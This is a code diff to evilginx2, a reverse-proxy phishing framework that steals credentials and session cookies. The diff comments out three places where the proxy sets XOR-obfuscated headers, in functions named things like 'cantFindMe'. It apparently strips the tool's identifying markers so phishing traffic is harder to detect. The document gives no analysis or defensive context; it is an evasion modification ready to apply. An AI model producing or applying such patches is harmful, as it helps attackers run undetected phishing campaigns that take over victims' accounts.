@@ -34,7 +34,7 @@ import (
 	"github.com/elazarl/goproxy"
 	"github.com/fatih/color"
 	"github.com/inconshreveable/go-vhost"
-	"github.com/mwitkow/go-http-dialer"
+	http_dialer "github.com/mwitkow/go-http-dialer"
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
@@ -404,7 +404,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-				req.Header.Set(string(hg), egg2)
+				// req.Header.Set(string(hg), egg2)
 
 				// patch GET query params with original domains
 				if pl != nil {
@@ -563,7 +563,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				for n, b := range e {
 					e[n] = b ^ 0x88
 				}
-				req.Header.Set(string(e), e_host)
+				// req.Header.Set(string(e), e_host)
 
 				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
 					s, ok := p.sessions[ps.SessionId]
@@ -1458,7 +1458,7 @@ func (p *HttpProxy) cantFindMe(req *http.Request, nothing_to_see_here string) {
 	for n, c := range b {
 		b[n] = c ^ 0x45
 	}
-	req.Header.Set(string(b), nothing_to_see_here)
+	// req.Header.Set(string(b), nothing_to_see_here)
 }
 
 func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
